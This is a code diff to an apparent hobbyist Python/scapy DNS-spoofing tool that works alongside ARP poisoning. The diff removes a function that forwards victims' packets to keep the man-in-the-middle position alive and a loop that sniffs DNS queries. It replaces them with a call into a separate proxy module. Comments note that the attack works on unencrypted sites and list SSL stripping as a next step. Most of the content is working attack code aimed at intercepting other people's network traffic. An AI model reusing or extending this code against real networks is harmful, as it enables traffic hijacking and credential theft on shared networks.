@@ -1,9 +1,7 @@
 import scapy.all as scapy
 import threading
 import arp_spoofing
-
-#THIS REQUIRES PORT FORWARDING TO BE DISABLED (our code is too slow to be faster than the real dns server)
-#sudo sysctl -w net.ipv4.ip_forward=0
+import proxy
 
 #currently seems to work on unencrypted requests (eg nike.com, but not https://apple.com)
 #TODO SSL strip first?
@@ -19,22 +17,6 @@ def isDnsQuery(packet):
 
 def isDnsResponse(packet):
     return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 1
-
-#all non dns packets need to be proxied, else the arp poisoning cuts them off the internet
-def proxy(packet):
-    if packet[scapy.IP].dst in victim_addresses.keys():
-        #needs to go to client
-        packet[scapy.Ether].dst = arp_spoofing.get_mac(packet[scapy.IP].dst) 
-    elif packet[scapy.IP].src in victim_addresses.keys():
-        #needs to go to router
-        packet[scapy.Ether].dst = arp_spoofing.get_mac(router_ip)
-    else :
-        return
-
-    del packet[scapy.IP].chksum
-    packet = packet.__class__(bytes(packet))
-
-    scapy.sendp(packet, verbose=0, iface=iface)
 
 #todo client doesnt seem to take this as answer even when cut off from internet
 def dns_spoof(packet):
@@ -63,28 +45,11 @@ def dns_spoof(packet):
 
 
     scapy.send(spoofed_response)
-
-def dns_main_loop():
-    while dns_looping:
-        #continuously sniff and respond to dns packets (udp port 53 is used for dns)
-        arp_tick()
-        try:
-            scapy.sniff(filter="udp port 53", prn=dns_spoof, timeout = 5)
-        except:
-            print("Error sniffing dns packets")
     
 
 def dns_main():
-    #on a thread we sniff for dns packets and respond with a spoofed response
     arp_prep_automated()
-    #dns_spoofing_thread = threading.Thread(target=dns_main_loop)
-    #dns_spoofing_thread.start()
-    dns_main_loop()
-
-
-
-
-
+    proxy.setup_proxy() #start a proxy and dns spoofing will be handled inside
 
 
 
